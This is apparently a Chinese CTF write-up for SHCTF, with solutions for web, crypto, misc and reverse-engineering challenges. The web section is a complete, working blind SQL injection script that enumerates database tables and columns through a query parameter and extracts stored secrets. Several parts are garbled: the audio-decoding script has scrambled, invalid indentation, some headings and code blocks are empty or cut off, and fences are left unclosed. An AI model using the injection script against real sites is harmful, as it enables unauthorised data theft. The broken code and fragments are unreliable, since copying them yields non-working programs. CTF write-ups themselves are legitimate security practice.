## [Web] **上古遗迹档案馆**

> 就是基础的`sql`注入
>
> ```python
> import requests
> 
> url = "http://challenge.shc.tf:32623"
> success_mark = "Success"
> 
> def request(payload):
>     full_payload = f"1' and ({payload}) # "
>     params = {"id": full_payload}
>     try:
>         r = requests.get(url, params=params, timeout=5)
>         return success_mark in r.text
>     except:
>         return False
> 
> def bin_search(payload_template, length=64):
>     result = ""
>     for i in range(1, length + 1):
>         low, high = 32, 126
>         char_found = False
>         while low <= high:
>             mid = (low + high) // 2
>             p = payload_template.format(i, mid)
>             if request(p):
>                 low = mid + 1
>                 char_found = True
>             else:
>                 high = mid - 1
>         
>         if char_found:
>             result += chr(low)
>             print(chr(low), end="", flush=True)
>             if result.endswith('}'):
>                 break
>         else:
>             break
>     return result
> 
> def start_exploit():
>     tables = []
>     for i in range(5):
>         print(f"Table {i}: ", end="")
>         table_p = f"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),{{}},1))>{{}}"
>         t_name = bin_search(table_p)
>         if not t_name:
>             break
>         tables.append(t_name)
>         print()
> 
>     if not tables:
>         return
> 
>     target_table = tables[0]
>     for t in tables:
>         if "flag" in t.lower() or "secret" in t.lower():
>             target_table = t
>             break
> 
>     columns = []
>     for i in range(5):
>         print(f"Column {i}: ", end="")
>         col_p = f"ascii(substr((select column_name from information_schema.columns where table_name='{target_table}' limit {i},1),{{}},1))>{{}}"
>         c_name = bin_search(col_p)
>         if not c_name:
>             break
>         columns.append(c_name)
>         print()
> 
>     if not columns:
>         return
> 
>     target_col = columns[0]
>     for c in columns:
>         if "flag" in c.lower() or "secret" in c.lower():
>             target_col = c
>             break
> 
>     print("Flag: ", end="")
>     final_payload = f"ascii(substr((select {target_col} from {target_table} limit 0,1),{{}},1))>{{}}"
>     bin_search(final_payload)
>     print()
> 
> if __name__ == "__main__":
>     start_exploit()
> ```
>
> 得到`flag`为`SHCTF{d13328e7-6652-4974-9c1e-85061a667078}`

>### 漏洞概述

## [Crypto] **Titanium Lock**

>### 从 trace 里恢复 128-bit key（线性代数 mod 3）
>
>```python
>b = ((popcount(n & key) % 3) % 2)
>```
>
>注意 `popcount % 3` 只可能是 `0/1/2`，而再次 `%2` 后：
>
>- `b=1` **当且仅当** `popcount(n&key) % 3 == 1`
>
>所以对所有 `b=1` 的 trace，都得到一条 **模 3 的线性方程**：
>
>![image-20260206092927754](/posts/shctf-writeup/image-20260206092927754.png)
>
>其中 `n_i` 是 `n` 的第 i bit（0/1），`key_i` 是 key 的第 i bit（0/1）。
>
>把所有 `b=1` 的方程收集起来，对 `GF(3)` 做高斯消元，直接解出唯一解；本题解出来的解恰好全是 `0/1`，于是得到真实 `key`。
>
>### 2）用 key 解 AES-CTR，拿到 f2 的输出列表
>
>AES key：`md5(str(key).encode()).digest()`
>nonce：`b"Tiffany\x00"`
>把 `result` 解密得到 `f2_out`（是一个 Python list 字符串）。
>
>### 3）逆掉 f2（线性变换）
>
>`f2` 是按 12 个一组输入，线性变换成 16 个输出：
>
>![image-20260206093008090](/posts/shctf-writeup/image-20260206093008090.png)
>
>取前 12 行当作 `12x12` 方阵解线性方程，得到每组 12 个原值；验证剩余 4 行确保没歧义。最终还原出 `v_padded`。
>
>### 4）拆 padding，恢复 f1 的 enc 序列长度
>
>`f2` 里有 `random.randint(0,255)` padding，使长度凑到 12 的倍数。
>在 `v_padded` 末尾能看到连续的小于等于 255 的值（本题 padlen=7），去掉得到 `enc`（长度 161）。
>
>### 5）爆 seed（6 位）+ 构造每一位十进制 digit 的候选集合
>
>f1 的关键关系：
>
>- 令 `t0=enc[0]`，`ti=enc[i]^enc[i-1]`
>- 对每个十进制 `digit`
>	- d 偶数：`ti = d + r`
>	- d 奇数：`ti = d * r` 其中 `r=random.randint(100000,999999)`。
>
>`seed `只有 100000~999999：
>
>- 先用前几位快速剪枝（候选为空直接丢）
>- 再校验 padding bytes
>- 再校验 `trace[0].n`（padding 后第一个 `getrandbits(128)`）
>
>唯一 `seed`：`137780`。
>
>这一步还会得到每一位 `digit` 的候选（多数是单值，部分会出现 `{0,1}` 这种不可区分的歧义）。
>
>### 6）可打印字符搜索 + digit-DP 判可行
>
>`bytes_to_long(flag)` 的十进制长度已知是 161，因此 `flag` 的 **字节长度也被唯一确定**。
>
>之后对 `flag` 做按字节的前缀搜索：
>
>- 已知前缀必须是 `b"SHCTF{"`
>- 末尾必须是 `b"}"`
>- 中间每一字节限定为可打印 ASCII（32~126）
>- 每扩展一个字节，就会把 `N=int.from_bytes(prefix + ???)` 的可能范围缩小成一个区间 `[lo, hi]`
>- 用 `digit-DP `判断：这个区间里是否存在一个数，其十进制每一位都落在第 5 步算出的候选集合里
>- 一路回溯/剪枝，最终得到唯一可打印的 `flag`

## [Crypto] **AES的诞生**

>### 1. 代码分析
>
>查看`task.py`，关键代码如下：
>
>```python
>def get_seed() -> Optional[bytes]:
>    length = len((f"{int(time() * 10 ** 6)}" * 2).encode("utf-8"))
>    if (length == 32) :
>        return (f"{int(time() * 10 ** 6)}" * 2).encode("utf-8")
>
>def chunk(data: bytes, group_size: int = 7, random_fill: bool = True) -> list[str]:
>    val = int.from_bytes(data, "big")
>    bin_str = format(val, "b")
>    ```
>    
>加密流程：
>
>1. 密钥 = 时间戳(微秒) 重复2次，长度必须32字节
>2. `flag`转成大整数，再转成二进制字符串
>3. 二进制字符串分成7位一组
>4. 每组独立用AES-CBC加密（每次都创建新的`encryptor`，从`IV`开始）
>
>### 2. 密钥推导
>
>密钥长度32字节 = 16位数字 × 2
>
>时间戳(微秒)必须是16位数字：
>
>- 最小: 10^15 = 1000000000000000 (对应 2001-09-09 01:46:40 UTC)
>- 题目提示"AES的诞生"
>
>AES重要时间点：
>
>- 2000-10-02: NIST宣布选择Rijndael
>- **2001-11-26**: FIPS 197正式发布 (AES成为标准)
>
>### 3. 已知明文攻击
>
>利用`flag`开头`SHCTF{`：
>
>- 转成7位二进制组
>- 暴力搜索2001-2003年的时间戳
>- 匹配第一个密文块
>
>找到密钥：
>
>- **时间**: 2001-11-25 16:00:00 UTC
>- **说明**: FIPS 197发布前8小时
>- **时间戳(微秒)**: 1006704000000000
>- **密钥**: `10067040000000001006704000000000`
>
>### 4. 解密与恢复
>
>解密后得到68个7位二进制组，最后一组`'01eMINo'`包含随机填充。
>
>**关键点**: `format(val, 'b')`不保留前导0！
>
>`flag`的第一个字节是'S' (0x53 = 01010011)，最高位是0，所以二进制表示少了1个前导0。
>
>恢复步骤：
>
>1. 取前67组 + 最后一组的前2位 = 471位
>2. 添加1个前导0 → 472位 = 59字节
>3. 转换为字节并解码
>
>## 解题脚本
>
>```python

## [Misc] **滴答滴答**

>`Hilbert 求瞬时频率 → 找 1200Hz sync → 按 Robot36 行结构抽样 → YCbCr 转 RGB 输出 PNG`
>
>```python
>import numpy as np
>import scipy.signal as sig
>import wave
>from PIL import Image
>
>W, H = 320, 240
>FS = 44100
>
>SYNC_THR = 1300      
>PORCH = 0.003        
>SYNC = 0.009         
>Y_LEN = 0.088        
>C_LEN = 0.044        
>
>def read_wav(path):
>    with wave.open(path, 'rb') as w:
>        n = w.getnframes()
>            data = w.readframes(n)
>             x = np.frombuffer(data, dtype=np.int16).astype(np.float32)
>         return x / 32768.0
>     
>    def inst_freq(x):
>    b, a = sig.butter(4, [900/(FS/2), 2600/(FS/2)], btype='band')
>    x = sig.filtfilt(b, a, x)
>        z = sig.hilbert(x)
>        ph = np.unwrap(np.angle(z))
>        f = np.diff(ph) * FS / (2*np.pi)
>        return np.concatenate([f, [f[-1]]])
>    
>    def map_intensity(freq, black=1500, white=2300):
>        v = (freq - black) / (white - black) * 255.0
>    return np.clip(v, 0, 255).astype(np.uint8)
>
>    def find_sync_lines(f):
>        mask = f < SYNC_THR
>    runs = []
>    i = 0
>        while i < len(mask):
>            if mask[i]:
>                s = i
>                while i < len(mask) and mask[i]:
>                     i += 1
>                 e = i
>                 dur = (e-s)/FS
>                 if 0.007 < dur < 0.012:
>                     runs.append((s, e))
>             else:
>                 i += 1
>         return runs  
>     
>     def sample_line(f, start):
>        y0 = start + int((SYNC + PORCH) * FS)
>    y_raw = f[y0 : y0 + int(Y_LEN * FS)]
>    c_raw = f[y0 + int(Y_LEN * FS) : y0 + int((Y_LEN + C_LEN) * FS)]
>    
>        y_idx = np.linspace(0, len(y_raw)-1, W).astype(np.int32)
>        c_idx = np.linspace(0, len(c_raw)-1, W//2).astype(np.int32)
>
>        return map_intensity(y_raw[y_idx]), map_intensity(c_raw[c_idx])
>    
>def ycbcr_to_rgb(Y, Cb, Cr):
>        Cb_full = np.repeat(Cb, 2, axis=1)
>        Cr_full = np.repeat(Cr, 2, axis=1)
>
>        Y = Y.astype(np.float32)
>    Cb_f = Cb_full.astype(np.float32) - 128
>    Cr_f = Cr_full.astype(np.float32) - 128
>    
>        R = Y + 1.402 * Cr_f
>        G = Y - 0.344136 * Cb_f - 0.714136 * Cr_f
>    B = Y + 1.772 * Cb_f
>    
>        return np.clip(np.stack([R, G, B], axis=-1), 0, 255).astype(np.uint8)
>    
>def main():
>        try:
>            x = read_wav("flag.wav")
>            f = inst_freq(x)
>        syncs = find_sync_lines(f)
>            
>            print(f"Detected sync lines: {len(syncs)}")
>
>        Y_img = np.zeros((H, W), dtype=np.uint8)
>            Cb = np.zeros((H, W//2), dtype=np.uint8)
>            Cr = np.zeros((H, W//2), dtype=np.uint8)
>
>            for i, (s, e) in enumerate(syncs[:H]):
>                line_y, line_c = sample_line(f, s)
>            Y_img[i] = line_y
>                if i % 2 == 0:
>                    Cb[i] = line_c
>                else:
>                Cr[i] = line_c

>                 if i % 2 == 0: Cr[i] = Cr[i-1]

## [Re] **Safe Image Encryption**

>**计算公式**：$k[i] = (((\text{enc\_A} \oplus 255) + 0x10) \& 0xFF) \oplus 0x55$
>
>**注意**：密钥索引 $i = (4 \times \text{pixel\_index} + 3) \pmod{1003}$
>
>这道题最难的地方在于 R、G、B 三个通道的掩码 $m$ 并不是简单的 XOR，而是引入了**像素坐标 ($x, y$)** 的动态变量。以下是经过逆向推导出的精确公式：
>
>- **红色通道 (R)**：$m_0 = ((k_0 \oplus 0xAA) + (x^2 + k_0)) \& 0xFF$
>- **绿色通道 (G)**：$m_1 = ((3 \times k_1) \oplus ((x \times y) \oplus k_2)) \& 0xFF$
>- **蓝色通道 (B)**：$m_2 = (((2 \times k_2) \oplus 0x66) + (y^2 + k_1)) \& 0xFF$
>- **透明通道 (A)**：$m_3 = ((k_3 \oplus 0x55) - 0x10) \& 0xFF$
>
>**提示**：这里的 $k_0, k_1, k_2, k_3$ 分别是该像素对应的连续四个密钥字节，即 $key[i \pmod{1003}]$ 到 $key[(i+3) \pmod{1003}]$
>
>```python
>import numpy as np
>from PIL import Image
>
>def solve():
>    try:
>        img = Image.open('encrypt.png').convert('RGBA')
>        w, h = img.size
>        pix = np.array(img, dtype=np.uint16)
>        flat = pix.reshape(-1, 4)
>
>        key = np.zeros(1003, dtype=np.uint16)
>        for p in range(1003):
>            idx = (p * 4 + 3) % 1003
>            mA = int(flat[p, 3]) ^ 255
>            key[idx] = ((mA + 0x10) & 0xFF) ^ 0x55
>
>        xs = np.tile(np.arange(w, dtype=np.uint32), h)
>        ys = np.repeat(np.arange(h, dtype=np.uint32), w)
>
>        p_idx = np.arange(len(flat), dtype=np.uint32)
>        i = (p_idx * 4) % 1003
>
>        k0 = key[i]
>        k1 = key[(i + 1) % 1003]
>        k2 = key[(i + 2) % 1003]
>        k3 = key[(i + 3) % 1003]
>
>        m0 = ((k0 ^ 0xAA) + (xs * xs + k0)) & 0xFF
>        m1 = ((3 * k1) ^ ((xs * ys) ^ k2)) & 0xFF
>        m2 = (((2 * k2) ^ 0x66) + (ys * ys + k1)) & 0xFF
>        m3 = ((k3 ^ 0x55) - 0x10) & 0xFF
>
>        mask = np.stack([m0, m1, m2, m3], axis=1).astype(np.uint8)
>        orig_flat = (flat.astype(np.uint8) ^ mask)
>        
>        orig_img = Image.fromarray(orig_flat.reshape(h, w, 4), mode='RGBA')

>        print("Success: decrypted_perfect.png saved")
>
>    except Exception as e:
>        print(f"Error: {e}")

>
>### 2）还原 exec 的 5 个运算
>
>`exec(o,a,b)` 通过函数表分发，trace 里能看到每个操作的“位运算版实现”：
>
>- `o=0`：用 `a^b`、`a&b`、进位循环实现 **加法**（a+b）
>- `o=1`：用 `(a & ~b) | (~a & b)` 的方式实现 **异或**（a^b）
>- `o=2`：循环调用 `func_1`（每次把位整体左移一位）=> **左移**（a<<b）
>- `o=3`：循环调用 `func_2`（每次把位整体右移一位）=> **右移**（a>>b）
>- `o=4`：`while(b){ if(b&1) res+=a; a<<=1; b>>=1; }` => **乘法**（a*b）
>
>所以我们可以把所有 `exec()` 直接替换为正常的 `+ ^ << >> *`。
>
>### 3）推出 key
>
>trace 里主程序明确写了 key 的生成式：
>
>- `seed1 = 0x12345678`
>- `seed2 = 0xDEADBEEF`
>- `key[0] = exec(4, seed1 & 0xFFFF, 0x1337)` => `(seed1&0xFFFF)*0x1337`
>- `key[1] = exec(0, seed2, 0xAAAA)` => `seed2+0xAAAA`
>- `key[2] = exec(1, key[0], key[1])` => `key0^key1`
>- `key[3] = exec(0, exec(4, key[2], 2), 1)` => `key2*2+1`
>
>### 4）识别出是“改版 TEA”
>
>在 `encrypt` 内部能看到：
>
>- `v3 = 40503 << 16 | 31161`，这就是 TEA 的 `delta = 0x9E3779B9`
>- `for (int i = 0; i < 32; i++)`，32 轮
>- 更新形式是三项异或再加到 v0/v1 上：
>	- `v4 = (v1<<2) + k[3]`
>	- `v5 = v1 + sum`
>	- `v6 = (v1>>4) + k[1]`
>	- `v7 = v4 ^ v5 ^ v6`
>	- `v0 += v7`
>	- 然后同理更新 `v1`，使用 `(v0<<2)+k[2]` 和 `(v0>>4)+k[0]`
>
>因此加密可写成（与标准 TEA 相比把移位改成 `<<2`/`>>4`，key 下标也换了）：
>
>```
>textsum += delta
>v0 += ((v1<<2)+k3) ^ (v1+sum) ^ ((v1>>4)+k1)
>v1 += ((v0<<2)+k2) ^ (v0+sum) ^ ((v0>>4)+k0)
